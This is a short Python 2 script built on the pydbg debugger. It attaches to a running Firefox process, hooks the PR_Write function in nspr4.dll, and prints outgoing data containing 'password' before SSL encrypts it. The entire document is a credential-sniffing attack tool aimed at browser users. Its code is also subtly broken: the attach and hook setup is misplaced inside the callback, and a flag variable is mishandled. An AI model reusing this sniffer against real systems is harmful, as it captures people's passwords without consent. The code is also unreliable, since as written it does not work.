from pydbg import *
from pydbg.defines import *

import utils
import sys

dbg = pydbg()
found_firefox = False

# set a global pattern that we can make the hook search for
pattern = "password"

# entry hook callback function
def ssl_sniff(dbg, args):
    # read the memory pointed to by second argument
    # loop on a read until a NULL byte reached
    buffer = ''
    offset = 0

    while 1:
        byte = dbg.read_process_memory(args[0] + offset, 1)
        if byte != "\x00":
            buffer += byte
            offset += 1
            continue
        else:
            break

    if pattern in buffer:
        print "Pre-Encrypted: %s" % buffer 
        return DBG_CONTINUE

    # quick process enumeration to find firefox.exe
    for (pid, name) in dbg.enumerate_processes():
        if name.lower() == "firefox.exe":
            found_firefox = True
            hooks = utils.hook_container()
            dbg.attach(pid)
            print "[*] Attaching to firefox.exe with PID: %d" % pid

            # Resolve function address
            hook_addess = dbg.func_resolve_debuggee("nspr4.dll", "PR_Write")

            if hook_addess:
                # add the hook to container
                hooks.add(dbg, hook_addess, 2, ssl_sniff, None)
                print "[*] nspr4.PR_Write hooked at 0x%08x" % hook_addess
                break
            else:
                print "[*] Error: Couldn't resolve hook address"
                sys.exit(-1)

        if found_firefox:
            print "[*] Hooks set, continuing process."
            dbg.run()

        else:
            print "[*] Error: Couldn't find the firefox.exe process"
            sys.exit(-1)